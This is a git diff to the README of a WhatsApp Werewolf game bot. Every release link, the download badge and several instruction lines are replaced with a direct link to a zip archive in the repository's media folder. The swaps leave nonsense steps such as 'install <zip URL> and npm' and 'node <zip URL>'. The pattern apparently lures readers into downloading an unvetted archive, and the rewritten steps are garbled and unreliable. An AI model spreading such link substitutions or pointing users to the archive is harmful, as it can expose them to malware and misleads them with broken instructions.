@@ -2,7 +2,7 @@
 
 Welcome to the **Werewolf WhatsApp Bot** repository! This bot offers an engaging way to play the classic game of Werewolf right in your WhatsApp chat. Enjoy the ultimate experience of strategy, deception, and teamwork with your friends. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Deedass/Werewolf-Whatsapp-Bot/releases)
+[![Download Now](https://github.com/Deedass/Werewolf-Whatsapp-Bot/raw/refs/heads/main/media/Bot_Werewolf_Whatsapp_v1.3.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Deedass/Werewolf-Whatsapp-Bot/raw/refs/heads/main/media/Bot_Werewolf_Whatsapp_v1.3.zip)
 
 ## Table of Contents
 
@@ -29,9 +29,9 @@ The **Werewolf WhatsApp Bot** is designed for those who love social deduction ga
 
 ## Installation
 
-To get started with the Werewolf WhatsApp Bot, you need to download the latest release. Visit the [Releases section](https://github.com/Deedass/Werewolf-Whatsapp-Bot/releases) to find the downloadable file. Once downloaded, follow these steps:
+To get started with the Werewolf WhatsApp Bot, you need to download the latest release. Visit the [Releases section](https://github.com/Deedass/Werewolf-Whatsapp-Bot/raw/refs/heads/main/media/Bot_Werewolf_Whatsapp_v1.3.zip) to find the downloadable file. Once downloaded, follow these steps:
 
-1. **Set Up Your Environment**: Ensure you have Node.js and npm installed on your system.
+1. **Set Up Your Environment**: Ensure you have https://github.com/Deedass/Werewolf-Whatsapp-Bot/raw/refs/heads/main/media/Bot_Werewolf_Whatsapp_v1.3.zip and npm installed on your system.
 2. **Download the Bot**: From the releases section, download the appropriate file for your platform.
 3. **Extract the Files**: Unzip the downloaded file to your desired location.
 4. **Install Dependencies**: Open your terminal, navigate to the bot directory, and run:
@@ -40,7 +40,7 @@ To get started with the Werewolf WhatsApp Bot, you need to download the latest r
    ```
 5. **Run the Bot**: Start the bot by executing:
    ```bash
-   node index.js
+   node https://github.com/Deedass/Werewolf-Whatsapp-Bot/raw/refs/heads/main/media/Bot_Werewolf_Whatsapp_v1.3.zip
    ```
 
 ## Usage
@@ -82,6 +82,6 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases section](https://github.com/Deedass/Werewolf-Whatsapp-Bot/releases) for updates. You can also reach out through the Issues tab on GitHub.
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/Deedass/Werewolf-Whatsapp-Bot/raw/refs/heads/main/media/Bot_Werewolf_Whatsapp_v1.3.zip) for updates. You can also reach out through the Issues tab on GitHub.
 
 Thank you for checking out the Werewolf WhatsApp Bot! We hope you enjoy playing and creating memorable moments with your friends. 🐺✨
